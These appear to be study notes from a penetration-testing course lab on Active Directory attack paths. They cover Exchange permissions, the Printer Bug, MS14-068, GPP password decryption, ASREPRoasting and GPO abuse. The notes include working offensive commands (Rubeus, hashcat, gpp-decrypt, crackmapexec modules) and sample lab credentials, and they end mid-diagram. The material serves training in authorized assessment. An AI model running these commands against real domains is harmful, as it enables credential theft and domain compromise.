![Image](https://images.openai.com/static-rsc-4/ungzIqc0HIBY5m83uMd3kSnqlvRALlBRUIBMHzDFf4m3fIaFSX5QUwBjIaFp5XTLmLwseHH1jnKwnKNcHnGI8kJ3eBOSOIOO0ExhcvCqTphWbuA_29aII-7pQ12qcmlmxWOm794hSXJMKpyFaX1lI6OMnnwjnZAKW8xkR3KB6ZniTD-bfkXgHTdd-mIc3lDB?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/DcxTHD-r8iLQlHtKN0ywsR-FSiBWdvuyX3nJhnstMHOpW7d-iKlcowSdJiDruJEweYEyL-B3XPNBlhQSV8GpCTBaUMFgWl1naqEbYZ3NM3_RxBVYL2LIch-8smX_VzjL3Ewj4MOXKc8itkaxDYTah9zlsjV5_h32jL1R4oq9nZHYI4DosTEDjQvxiagiuC2-?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/IiaVNWovs3HLanvsv1jkv2FuujJNln1son3_rTyJqQz9l5V6NJi9A3-KlNFmgKgOjKJa64tyCQqxYnerQOzzPW8Srv_rn3vmgnNy15_-yQp01bUeYBaNl__NnRjYib-4VhnpKWilbwJRyJ79qm38XKAVKEceeE4iaNHDVkdIV3RGGuX_wj6UUjCctqcTPyCi?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/dGdUIfHjw0yBBpaMsJqVjTOSvrDQlGrPJzPIQVQUOthmuPqVMuV4lm9WtrZsLBTL-Esosz_zvtD33biUky913odL3BIW9eblJpHQdZno0TzPYKnZx0tmJFhxUHPZbZetLw6J6_hoMjynKgWPFuCvXMJcWkmm7AqJ9QszX0tnY5-Sh4U9p3HjDledVYEbdvO4?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/dDW_B-5kEzDJwWSdPyd6AJTQuxa5kFUmBX_qN_70G9-1U6eUwQqaQ63MIQyiU55jWYK8d8crkQ4z5RfvjZBjUtqG870TivCvdYUD2PlKH2A_Z_5nBDBO5p5w7vjJG8kHg4ojVPqmgMU4PpuB3p4M-uBQG9kgSbPdevG0vkiCqA_G-EAf8RqEAYG3y5H2IHaR?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/20ue0PYCQdkHeY4o7cg_FI6L_iTTTgl-nCQQ_uHw8h0_w5ZtKl16AzCcC4UKNYWhW5uqwPhQoY8DGfXzNf5ssg7sLciVJj-Y0Z-90wERPzdLkjZVh7xknSqqae57usCzrd4My4LxdcKkhzQbE0dGgqIOxB6jALw9LAGfPnyIY1-f8XFilRmxBU4iDh6dhw7M?purpose=fullsize)

## 1. Introduction

Active Directory (AD) environments contain many different attack paths and misconfigurations.

A broad understanding of AD is important because attackers may encounter unusual configurations that do not fit into the more common attack techniques.

### Main idea

> **Think beyond the obvious attack path.**

During an assessment, always look for:

- Incorrect group memberships
    
- Weak ACLs
    
- Exposed credentials
    
- Misconfigured Exchange permissions
    
- Kerberos weaknesses
    
- DNS records
    
- GPO permissions
    
- Passwords stored in scripts
    
- SYSVOL credentials
    
- Accounts with unusual `userAccountControl` settings
    
- Authentication-relay opportunities
    

The objective is to identify weaknesses that could provide:

**Initial Access → Credential Access → Privilege Escalation → Lateral Movement → Domain Compromise**

---

# 2. Scenario Setup

The material uses both:

- **Windows attack host**
    
- **Linux attack host**
    

The Windows attack host is referred to as **MS01**.

For Linux-based portions, the Windows host can be used to SSH into:

```text
172.16.5.225
```

Credentials provided in the lab:

```text
Username: htb-student
Password: HTB_@cademy_stdnt!
```

The important lesson is that AD assessments frequently require switching between Windows and Linux tooling.

---

# 3. Exchange-Related Group Membership

## 3.1 Exchange in Active Directory

A default Microsoft Exchange installation can introduce several attack paths.

Exchange is frequently granted significant privileges through:

- Users
    
- Groups
    
- ACLs
    
- Exchange security groups
    

One particularly important group is:

```text
Exchange Windows Permissions
```

This group is **not a protected group**, but its members can have the ability to:

```text
WriteDACL
```

against the domain object.

### Why is WriteDACL important?

`WriteDACL` allows an attacker to modify the permissions/ACL of an object.

If an attacker obtains sufficient control over the domain object, they may be able to grant themselves powerful rights such as:

```text
DCSync
```

DCSync can ultimately allow retrieval of password hashes from Active Directory.

### Important attack chain

```text
Compromised Account
       ↓
Exchange Windows Permissions
       ↓
WriteDACL on Domain
       ↓
Grant DCSync Rights
       ↓
DCSync
       ↓
Domain Credential Extraction
```

The source notes that accounts belonging to **Account Operators** may also be relevant because of their ability to modify certain accounts and memberships.

---

# 4. Organization Management

Another extremely powerful Exchange group is:

```text
Organization Management
```

It is effectively the highly privileged administrative group for Exchange.

Members can:

- Manage Exchange
    
- Access mailboxes
    
- Perform highly privileged Exchange administration
    

The source specifically notes that this group can access the mailboxes of domain users.

It also has full control over the OU:

```text
Microsoft Exchange Security Groups
```

This OU contains:

```text
Exchange Windows Permissions
```

### Important relationship

```text
Organization Management
          ↓
Microsoft Exchange Security Groups OU
          ↓
Exchange Windows Permissions
```

Therefore, compromise of an Exchange server or highly privileged Exchange account can have serious consequences.

---

# 5. Compromising an Exchange Server

If an Exchange server is compromised, the attacker may potentially obtain:

```text
Domain-level privileges
```

Another important issue is credential exposure.

The source notes that credential dumping from Exchange servers may reveal:

- Cleartext credentials
    
- NTLM hashes
    
- Numerous user credentials
    

### Why?

Users authenticate through:

```text
Outlook Web Access (OWA)
```

Exchange may cache authentication material in memory after successful authentication.

Therefore:

```text
Compromise Exchange
       ↓
Dump credentials from memory
       ↓
Recover user credentials/hashes
       ↓
Reuse credentials
       ↓
Further AD compromise
```

---

# 6. PrivExchange

## 6.1 What is PrivExchange?

**PrivExchange** is an attack involving the Exchange Server:

```text
PushSubscription
```

feature.

The flaw allows a domain user with a mailbox to force the Exchange server to authenticate to a host controlled by the attacker over:

```text
HTTP
```

---

## 6.2 Why is this dangerous?

The Exchange service historically ran as:

```text
SYSTEM
```

and, prior to certain 2019 cumulative updates, had excessive permissions including:

```text
WriteDACL
```

on the domain.

This creates an authentication-relay opportunity.

### High-level attack chain

```text
Authenticated Domain User
          ↓
PrivExchange
          ↓
Force Exchange Authentication
          ↓
Relay Authentication
          ↓
LDAP
          ↓
Modify Domain Permissions
          ↓
DCSync Rights
          ↓
Domain Credential Extraction
```

If LDAP relay is not possible, the authentication may potentially be relayed to other services/hosts depending on the environment.

### Key takeaway

PrivExchange demonstrates how:

**Authentication coercion + excessive privileges + relay**

can result in major domain compromise.

---

# 7. Printer Bug

## 7.1 What is the Printer Bug?

The **Printer Bug** is associated with the:

```text
MS-RPRN
```

protocol.

MS-RPRN is the:

```text
Print System Remote Protocol
```

It handles communication related to print-job processing and print-system management.

---

## 7.2 Core weakness

A domain user can interact with the print spooler through:

```text
RpcOpenPrinter
```

and:

```text
RpcRemoteFindFirstPrinterChangeNotificationEx
```

This can force a vulnerable server to authenticate to an attacker-controlled host over:

```text
SMB
```

---

## 7.3 Why does it matter?

The Windows Print Spooler service commonly runs as:

```text
SYSTEM
```

Therefore, forced authentication can potentially create a privileged authentication-relay opportunity.

One possible attack path is:

```text
Printer Bug
     ↓
Force SYSTEM authentication
     ↓
SMB authentication
     ↓
Relay
     ↓
LDAP
     ↓
Grant DCSync privileges
     ↓
Dump AD password hashes
```

---

# 8. Printer Bug + RBCD

The Printer Bug can also be combined with:

```text
Resource-Based Constrained Delegation (RBCD)
```

An attacker may potentially relay LDAP authentication and configure RBCD so that a controlled computer account can authenticate as a user to the victim computer.

Conceptually:

```text
Printer Bug
     ↓
Forced Authentication
     ↓
LDAP Relay
     ↓
Configure RBCD
     ↓
Controlled Computer Account
     ↓
Authenticate as privileged user
     ↓
Compromise target
```

The source also notes that Printer Bug techniques can become relevant across forest trusts when conditions such as delegation and existing administrative access are present.

---

# 9. Enumerating for the Printer Bug

The source demonstrates using:

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Example:

```text
ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

### Interpretation

```text
True
```

indicates that the queried host is responding as vulnerable/available for the spooler-related check.

### Tool/function

```text
Get-SpoolStatus
```

is used to identify systems relevant to the MS-PRN Printer Bug.

---

# 10. MS14-068

## 10.1 What is MS14-068?

**MS14-068** was a vulnerability involving the Kerberos authentication protocol.

It could allow a standard domain user to escalate privileges toward:

```text
Domain Admin
```

---

## 10.2 Understanding the PAC

A Kerberos ticket contains information about the user, including:

- Account name
    
- User ID
    
- Group membership
    

This information is contained in the:

```text
Privilege Attribute Certificate (PAC)
```

The PAC is cryptographically protected by the KDC.

---

## 10.3 Vulnerability

The vulnerability allowed a forged PAC to be accepted as legitimate.

An attacker could potentially create a forged PAC representing the user as a member of:

```text
Domain Administrators
```

or another privileged group.

### Attack concept

```text
Normal Domain User
       ↓
MS14-068 vulnerability
       ↓
Forge PAC
       ↓
Kerberos accepts modified privileges
       ↓
Privileged authentication
       ↓
Domain compromise
```

Tools historically associated with this vulnerability include:

```text
PyKEK
Impacket
```

### Defense

The source emphasizes:

> **The only defense against this attack is patching.**

The Hack The Box machine **Mantis** demonstrates this vulnerability.

---

# 11. Sniffing LDAP Credentials

Many devices and applications need LDAP credentials to communicate with Active Directory.

Examples include:

- Printers
    
- Web administration panels
    
- Network appliances
    
- Applications
    

These systems may contain:

```text
LDAP username
LDAP password
LDAP server
```

---

## 11.1 Common weaknesses

Credentials may be:

- Stored in cleartext
    
- Protected by a weak/default password
    
- Exposed through a `test connection` feature
    

A vulnerable `test connection` function may allow an assessor to redirect the LDAP connection toward an assessment host.

Conceptually:

```text
Application
     ↓
"Test LDAP Connection"
     ↓
Attacker-controlled LDAP endpoint
     ↓
Credentials sent
     ↓
Credential capture
```

LDAP commonly uses:

```text
TCP/389
```

The source describes using a listener on port 389 in some scenarios.

---

## 11.2 Why LDAP credentials matter

LDAP service accounts may be:

- Highly privileged
    
- Used across multiple systems
    
- Valid domain accounts
    

Even if the account is not privileged, it can potentially provide:

```text
Initial Foothold
```

or additional information for lateral movement.

---

# 12. Enumerating DNS Records

Active Directory-integrated DNS can contain valuable information.

A useful tool is:

```text
adidnsdump
```

It can enumerate DNS records using a valid domain user account.

---

## 12.1 Why DNS enumeration matters

Suppose BloodHound returns a host with an unhelpful name:

```text
SRV01934
```

It may be difficult to determine what service or purpose that server has.

DNS may contain another record pointing to the same IP:

```text
JENKINS.INLANEFREIGHT.LOCAL
```

This immediately gives the host a more meaningful identity.

### Example

```text
SRV01934
     ↓
DNS enumeration
     ↓
JENKINS.INLANEFREIGHT.LOCAL
     ↓
Identify service/purpose
     ↓
Plan enumeration
```

---

## 12.2 Why does adidnsdump work?

By default, users can list child objects of an AD DNS zone.

However, normal LDAP DNS queries may not return every useful record.

`adidnsdump` helps retrieve and resolve additional DNS information.

---

## 12.3 Basic command

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```

Example result:

```text
Connecting to host...
Binding to host
Bind OK
Querying zone for records
Found 27 records
```

The results are saved in:

```text
records.csv
```

---

## 12.4 Example records

```text
type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,...
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
```

The interesting record is:

```text
?,LOGISTICS,?
```

The IP address is initially unknown.

---

## 12.5 `-r` option

The `-r` option attempts to resolve unknown records.

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

The previously unknown record may become:

```text
A,LOGISTICS,172.16.5.240
```

### Important takeaway

Always consider AD-integrated DNS as an additional source of host/service discovery information.

---

# 13. Important Tools — Quick Reference

|Purpose|Tool / Command|
|---|---|
|Printer Bug enumeration|`Get-SpoolStatus`|
|AD DNS enumeration|`adidnsdump`|
|Kerberos exploitation|`PyKEK` / Impacket|
|AD enumeration|PowerView|
|Relationship mapping|BloodHound|
|Kerberos AS-REP extraction|Rubeus|
|AS-REP cracking|Hashcat / John|
|User enumeration|Kerbrute|
|AS-REP user hunting|`GetNPUsers.py`|
|GPO enumeration|PowerView / `Get-GPO`|
|GPO abuse|SharpGPOAbuse|

![Image](https://images.openai.com/static-rsc-4/8rmgTf4-COMF4_CxefTnxCcIgRd3A6ou9w5cA1bjsXt76pXfUqY_7SaL6ZgUABfG_et_6W5jlrv4toToEki-SHfogmCwUtgG6K4v7Xcunus_4e2_k22XYVnVYN0pal4ultEhPjEul4GE7FHAwxD0Qapxsr_XWnSbXkDVQFo1gT-ou3s_mJRRuNOpqbX7Ssrt?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8_MW6JY-nxiZVA9lspGYkJs32bT7VRIgkltegtEGReBnPYPAHP7dL5bcm8Dr_6DQjevwCtgLnnCCY_XMu73JBrdR0s5LwaH7Fex22CzRKfVJB-IhopagPFysIUcxsZJB8BsHIklIbfl_bav0QP_2MAdHZ-M6AWuPpKvxp10X3vqSx19JctUP2NWXcIKyZ0c7?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8hGKTqI0daBmM9op05uwPciaadChdPnvvUwAZ1RnSljlm3pWcK708DPm-uV4vuU-dcfkiZ1vZRmRHPxnnOquCtmEv8Y4beChySlZNdUk7LiV2GjowmQ7VsZRKeA6vJbDLp-oXVNbmhN16wLCi7gcQTdFm6vnIbtpYPt5RA85yWMxg4UPzTONl6rv_dvJI77o?purpose=fullsize)

# 14. Passwords in Description Fields

Sensitive information is sometimes stored directly inside AD user attributes.

Common locations include:

```text
Description
Notes
```

Administrators may accidentally place:

- Passwords
    
- Temporary credentials
    
- Service account information
    
- Internal notes
    

in these fields.

---

## 14.1 Enumerating descriptions

PowerView:

```powershell
Get-DomainUser * |
Select-Object samaccountname,description |
Where-Object {$_.Description -ne $null}
```

Example:

```text
samaccountname    description
--------------    -----------
administrator     Built-in account for administering the computer/domain
guest             Built-in account for guest access to the computer/domain
krbtgt            Key Distribution Center Service Account
ldap.agent        *** DO NOT CHANGE *** 3/12/2012: Sunsh1ne4All!
```

### Important

The interesting entry is:

```text
ldap.agent
```

because the description contains what appears to be a password.

### Assessment mindset

When enumerating AD users:

```text
Users
 ↓
Description
 ↓
Notes
 ↓
Other attributes
 ↓
Look for sensitive information
```

---

# 15. PASSWD_NOTREQD

## 15.1 What is PASSWD_NOTREQD?

`PASSWD_NOTREQD` is a flag in the:

```text
userAccountControl
```

attribute.

When set, the account is not subject to the current domain password-length requirement in the normal way.

This can mean:

- The account may have a shorter password.
    
- In environments where empty passwords are allowed, an empty password may be possible.
    
- The flag may exist for historical/vendor reasons.
    

### Important clarification

**PASSWD_NOTREQD does NOT automatically mean the account has no password.**

It means that the normal password requirement may not apply.

---

## 15.2 Why enumerate it?

The source recommends identifying accounts with this flag and testing them during an authorized assessment.

Possible reasons include:

- Administrator intentionally configured it
    
- Legacy account
    
- Vendor-created account
    
- Installation process set it
    
- Configuration was never cleaned up
    

---

## 15.3 Enumeration

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD |
Select-Object samaccountname,useraccountcontrol
```

Example accounts:

```text
guest
mlowe
ehamilton
nagiosagent
```

### Key takeaway

```text
PASSWD_NOTREQD ≠ No Password
```

It simply indicates an unusual password-policy condition that deserves investigation.

---

# 16. Credentials in SMB Shares and SYSVOL Scripts

## 16.1 SYSVOL

The:

```text
SYSVOL
```

share can contain valuable information.

Authenticated domain users can commonly read many files in SYSVOL.

Potentially interesting files include:

```text
.bat
.vbs
.ps1
.xml
```

These scripts may contain:

- Passwords
    
- Service credentials
    
- Local administrator credentials
    
- Old credentials
    
- Configuration information
    

---

## 16.2 Example enumeration

```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

Example:

```text
daily-runs.zip
disable-nbtns.ps1
Logon Banner.htm
reset_local_admin_pass.vbs
```

The interesting file is:

```text
reset_local_admin_pass.vbs
```

---

## 16.3 Password inside a script

The script contains:

```vbscript
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0CAlADmin!"
```

This represents a serious credential exposure.

### Possible assessment process

```text
Find script
    ↓
Identify username/password
    ↓
Determine whether credential is current
    ↓
Identify hosts where it works
    ↓
Assess privileges
    ↓
Continue authorized assessment
```

The source mentions using tools such as CrackMapExec with:

```text
--local-auth
```

to assess whether local credentials work on other hosts.

---

# 17. Group Policy Preferences (GPP) Passwords

## 17.1 What are GPP passwords?

Group Policy Preferences can create XML files inside:

```text
SYSVOL
```

These files can configure:

- Mapped drives
    
- Local users
    
- Printers
    
- Services
    
- Scheduled tasks
    
- Local administrator passwords
    

---

## 17.2 The `cpassword` problem

GPP password values may appear as:

```text
cpassword
```

The value is encrypted using:

```text
AES-256
```

However, Microsoft published the relevant AES private key publicly.

Therefore, historical GPP passwords stored in SYSVOL can be decrypted.

---

## 17.3 MS14-025

Microsoft addressed the ability to create new GPP passwords through:

```text
MS14-025
```

However, patching did **not automatically remove old password-containing files** from SYSVOL.

This is an important distinction.

### Remember

```text
Patch applied
     ≠
Old GPP credentials automatically removed
```

Existing vulnerable configuration may remain.

---

# 18. Decrypting GPP Passwords

The source demonstrates:

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

Result:

```text
Password1
```

### Key concept

```text
SYSVOL
  ↓
Groups.xml / other GPP XML
  ↓
cpassword
  ↓
Known Microsoft AES key
  ↓
Decrypt
  ↓
Password
```

---

# 19. Finding GPP Passwords

Possible approaches/tools mentioned in the source include:

```text
Get-GPPPassword.ps1
```

Metasploit GPP post module

CrackMapExec modules:

```text
gpp_password
gpp_autologin
```

---

## 19.1 CrackMapExec module discovery

```bash
crackmapexec smb -L | grep gpp
```

Example modules:

```text
gpp_autologin
gpp_password
```

### `gpp_password`

Used to retrieve information associated with passwords pushed through Group Policy Preferences.

### `gpp_autologin`

Searches for:

```text
Registry.xml
```

and attempts to retrieve autologon credentials.

---

# 20. GPP Autologon Credentials

Autologon may be configured so that a machine automatically logs in.

This can be used on:

- Shared workstations
    
- Kiosks
    
- Guard desks
    
- Shift-based workstations
    

If configured through Group Policy, credentials can potentially be stored in:

```text
Registry.xml
```

The source notes that these credentials may remain readable by authenticated domain users.

---

## 20.1 Example

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

Example output identifies:

```text
Username: guarddesk
Domain: INLANEFREIGHT.LOCAL
Password: ILFreightguardadmin!
```

The important lesson is not the specific credential, but the exposure pattern:

```text
GPO Autologon
      ↓
Registry.xml
      ↓
Credential exposure
      ↓
Potential local/domain account access
```

---

# 21. Password Reuse

A recurring theme in AD security is:

```text
Password Reuse
```

Whenever credentials are discovered, assess whether the same credentials are used elsewhere **within the authorized scope**.

Possible reuse locations include:

- Other hosts
    
- Local accounts
    
- Domain accounts
    
- SMB shares
    
- Services
    
- Administrative accounts
    

### Conceptual chain

```text
Credential discovered
       ↓
Check authorized reuse
       ↓
Additional account/host access
       ↓
New privileges
       ↓
Further enumeration
```

Password reuse can significantly increase the impact of an otherwise limited credential exposure.

---

# 22. ASREPRoasting

## 22.1 What is ASREPRoasting?

ASREPRoasting targets accounts where:

```text
Do not require Kerberos pre-authentication
```

is enabled.

The relevant Kerberos setting is:

```text
DONT_REQ_PREAUTH
```

---

## 22.2 Normal Kerberos authentication

Normally:

```text
User enters password
       ↓
Password protects authentication timestamp
       ↓
Domain Controller validates it
       ↓
TGT issued
       ↓
Further Kerberos authentication
```

---

## 22.3 When pre-authentication is disabled

If pre-authentication is disabled:

```text
Attacker requests authentication data
       ↓
Domain Controller returns AS-REP
       ↓
AS-REP is encrypted using account password-derived material
       ↓
Captured offline
       ↓
Password cracking attempt
```

The key advantage for an attacker is that the cracking can occur:

```text
Offline
```

---

# 23. ASREPRoasting vs Kerberoasting

|ASREPRoasting|Kerberoasting|
|---|---|
|Targets accounts without Kerberos pre-auth|Targets service accounts/SPNs|
|Attacks AS-REP|Attacks TGS-REP|
|SPN not required|SPN is normally required|
|Can obtain AS-REP for affected accounts|Requests service tickets|
|Offline cracking|Offline cracking|

### Remember

```text
ASREPRoasting → AS-REP
Kerberoasting → TGS-REP
```

---

# 24. Enumerating ASREPRoastable Users

PowerView:

```powershell
Get-DomainUser -PreauthNotRequired |
select samaccountname,userprincipalname,useraccountcontrol |
fl
```

Example:

```text
samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

The critical flag is:

```text
DONT_REQ_PREAUTH
```

---

# 25. Retrieving an AS-REP with Rubeus

The source demonstrates:

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

Important options:

```text
asreproast
/user:mmorgan
/nowrap
/format:hashcat
```

`/nowrap` is useful because it prevents the output from being wrapped across columns.

The result can be saved and used for offline password cracking.

---

# 26. Cracking AS-REP Offline

The source uses Hashcat mode:

```text
18200
```

Example:

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

### Workflow

```text
Find DONT_REQ_PREAUTH account
            ↓
Obtain AS-REP
            ↓
Save AS-REP hash
            ↓
Hashcat
            ↓
Password recovery if password is weak
```

The source example demonstrates a successful crack.

### Important point

ASREPRoasting does not automatically mean the password will be cracked.

Success depends heavily on:

- Password strength
    
- Password complexity
    
- Wordlist quality
    
- Password reuse
    
- Cracking resources
    

---

# 27. Kerbrute and ASREPRoasting

Kerbrute can perform user enumeration and identify accounts where Kerberos pre-authentication is not required.

Example:

```bash
kerbrute userenum -d inlanefreight.local \
--dc 172.16.5.5 \
/opt/jsmith.txt
```

When an affected user is discovered, Kerbrute can retrieve the AS-REP material.

Example output:

```text
mmorgan has no pre auth required.
Dumping hash to crack offline:
$krb5asrep$23$...
```

---

# 28. GetNPUsers.py

Impacket provides:

```text
GetNPUsers.py
```

This can hunt for users who do not require Kerberos pre-authentication.

Example:

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ \
-dc-ip 172.16.5.5 \
-no-pass \
-usersfile valid_ad_users
```

The tool can return:

```text
$krb5asrep$23$...
```

for accounts where:

```text
UF_DONT_REQUIRE_PREAUTH
```

is set.

---

# 29. Important ASREPRoasting Points

Remember these for exams/interviews:

### Requirement

```text
DONT_REQ_PREAUTH
```

### SPN required?

```text
No
```

### Authentication material

```text
AS-REP
```

### Offline cracking?

```text
Yes
```

### Common tools

```text
Rubeus
Kerbrute
GetNPUsers.py
Hashcat
John the Ripper
```

### Domain-joined machine required?

The source emphasizes that you do **not** need to be on a domain-joined host to perform the relevant enumeration/attack when the necessary network access and information are available.

![Image](https://images.openai.com/static-rsc-4/Pp5bVg39cyedHalqc9yxfJsfIQruj92F_Bcgvwl_0eGY3Qor3liuudzJPUnzpUsTCS6lI_ZNkd1Yaknqp3EwsO_Tem69AIVTYNgcvGYl2v4uitvzEqYlE1doq_-VzqE18V42UvkGwY7RwJXjWsWO_YlGxAVT7lmW4IM5JEskrf8PNuul1ztkTF2kwuHmdWvd?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/cSktAeAzpcTF9nymtIyJ6MP7ys6af3czrEmnsjzbvftKwS2fDIpDJtepTHcLs8o4bKsDbdLaEMdN67gu0V4n2yEnGNOvuqmoz99x9cI2gduRiykr3v8HE4z05oFQvJ_8jgreNpfUzLXw90eOFvW7rOziKQAq8eOoAf0XNaKbSHUZtTzJtiWxrNnwJPrVnQEk?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/4O7WtVX35ajAvsMvrO6nxV_zZEmhD4yvdTdXKsFbCJ925zgyJkb64xJ_BJl3H-I-NsyduTyaRmMAwMcxe0N2WExF54ImV6sZFjVaQjWe3TKmyENrtq-PUX3kk6eteW8aYqF6J9aXb4HGtsgUdsbVt6bWS1VUhBOJjq7ECW15meso6QQUbekD9zAxlUMkXuGy?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/_pkl4fI0rbx9XFgcfKcwnRcajlGU48PDhF86H3MvCvLXV13M3iMaWMWBrzOvDCL124uG0qcB6alqaGn5TivZoTmetOHFE1pAH_hrFkfZlEL1NAeEGDOYbmqcSEEsLhBhcz8q8q6HwnQ7gvv9FBQjapYpvqoDMGhxMhsMD1h1sR4i3LND6EY-_2-Hn9JnmjEK?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/rvAgnmZwE0S0-EsCv9ys_8m_OjdK_SSW_wtAq5RDt8e5ikENXqBxjEMgtLjxpQ0vGRWLV1wbI9M-5t052g3PVN8Ts9tREa2vUiRei_8VyWEC0C6QbTqoUcNuQu-vrXSO4k0Yko90jmR45V-roFUTQ52PvPhOlSMZPy1WRZtetwAFQYj3MXmcQzLh7V0GnWNJ?purpose=fullsize)

# 30. Group Policy Object (GPO) Abuse

## 30.1 What is Group Policy?

Group Policy allows administrators to configure:

- Users
    
- Computers
    
- Operating systems
    
- Applications
    
- Security settings
    
- Authentication behavior
    

GPOs are normally a defensive/administrative mechanism.

However, incorrect permissions can turn them into a powerful attack path.

---

# 31. Why GPO Misconfigurations Are Dangerous

If an attacker gains sufficient rights over a GPO, they may potentially use it for:

- Lateral movement
    
- Privilege escalation
    
- Domain compromise
    
- Persistence
    

### Example attack chain

```text
Low-privileged account
        ↓
Misconfigured GPO ACL
        ↓
Gain control over GPO
        ↓
Modify GPO settings
        ↓
GPO applies to users/computers
        ↓
Execute privileged action
        ↓
Privilege escalation / lateral movement
```

---

# 32. Possible GPO Abuse

The source lists several possibilities:

### 1. Add privileges

Examples:

```text
SeDebugPrivilege
SeTakeOwnershipPrivilege
SeImpersonatePrivilege
```

### 2. Add a local administrator

A controlled account can potentially be added to:

```text
Local Administrators
```

on affected hosts.

### 3. Immediate scheduled task

A scheduled task can potentially be pushed through the GPO.

This may be used to execute an action on affected computers.

---

# 33. Enumerating GPOs

Several tools can enumerate GPO information:

```text
PowerView
BloodHound
Group3r
ADRecon
PingCastle
```

---

## 33.1 PowerView

The source uses:

```powershell
Get-DomainGPO | Select displayname
```

Example GPOs:

```text
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

---

# 34. Why GPO Names Are Interesting

GPO names can reveal information about the environment.

For example:

```text
Deny CMD Access
```

may indicate command-line restrictions.

```text
Service Accounts Password Policy
```

may indicate special password policies for service accounts.

```text
AutoLogon
```

may indicate that automatic login is configured.

```text
Certificate Services
```

may indicate that:

```text
Active Directory Certificate Services (AD CS)
```

is present.

This helps an assessor understand the security architecture before deeper enumeration.

---

# 35. Built-in PowerShell GPO Enumeration

If Group Policy Management tools are installed:

```powershell
Get-GPO -All | Select DisplayName
```

This provides another method for enumerating GPOs.

---

# 36. Checking GPO Permissions

Finding a GPO is not enough.

The important question is:

> **Who can modify it?**

The source demonstrates checking whether:

```text
Domain Users
```

have permissions over GPOs.

First:

```powershell
$sid=Convert-NameToSid "Domain Users"
```

Then:

```powershell
Get-DomainGPO | Get-ObjectAcl |
?{$_.SecurityIdentifier -eq $sid}
```

---

# 37. Dangerous GPO Permissions

The example shows:

```text
CreateChild
DeleteChild
ReadProperty
WriteProperty
Delete
GenericExecute
WriteDacl
WriteOwner
```

The particularly important permissions include:

```text
WriteProperty
WriteDacl
WriteOwner
```

---

## 37.1 WriteDACL

Allows modification of the object's ACL.

Conceptually:

```text
WriteDACL
   ↓
Modify permissions
   ↓
Grant additional rights
   ↓
Potentially obtain full control
```

---

## 37.2 WriteOwner

Allows ownership-related manipulation.

Ownership can sometimes be leveraged to gain additional control over an object.

---

## 37.3 GenericWrite

Another important permission that may allow modification of object properties.

---

# 38. Converting GPO GUID to Name

Sometimes enumeration returns only a GPO GUID.

Example:

```text
7CA9C789-14CE-46E3-A722-83F4097AF532
```

The source uses:

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Result:

```text
DisplayName : Disconnect Idle RDP
DomainName  : INLANEFREIGHT.LOCAL
Owner       : INLANEFREIGHT\Domain Admins
Id          : 7ca9c789-14ce-46e3-a722-83f4097af532
```

Therefore:

```text
GPO GUID
   ↓
Get-GPO
   ↓
GPO name
   ↓
Understand its purpose
```

---

# 39. BloodHound and GPO Abuse

BloodHound can help visualize:

```text
User/Group
     ↓
GPO permissions
     ↓
GPO
     ↓
Affected OU
     ↓
Computers
```

In the example, BloodHound shows that:

```text
DOMAIN USERS
```

has rights such as:

```text
GenericWrite
WriteOwner
WriteDacl
```

over:

```text
DISCONNECT IDLE RDP
```

---

# 40. Finding Affected Computers

A GPO is not useful to an attacker simply because it is editable.

You must also determine:

> **Where is the GPO linked?**

BloodHound's:

```text
Affected Objects
```

section can show the OU to which the GPO applies.

Example:

```text
DISCONNECT IDLE RDP
          ↓
APPLICATION OU
          ↓
Multiple computer objects
```

Therefore:

```text
Editable GPO
      +
Affected computers
      =
Potential attack path
```

---

# 41. SharpGPOAbuse

A tool mentioned in the source is:

```text
SharpGPOAbuse
```

It can be used to take advantage of GPO permission misconfigurations.

Potential actions include:

- Adding a user to local administrators
    
- Creating an immediate scheduled task
    
- Creating a malicious computer startup script
    
- Executing actions on affected hosts
    

---

# 42. IMPORTANT — GPO Scope

This is one of the most important operational lessons in the section.

A GPO may apply to:

```text
Many computers
```

at once.

For example:

```text
Editable GPO
      ↓
OU
      ↓
1,000 computers
```

A careless modification could affect all 1,000 systems.

Therefore, during an authorized assessment:

> **Always determine the GPO's scope before modifying it.**

The source specifically warns against accidentally adding an account as local administrator across a large number of hosts.

---

# 43. Overall Attack-Path Mindset

The different techniques in this section demonstrate a common AD security principle:

```text
Misconfiguration
      ↓
Enumeration
      ↓
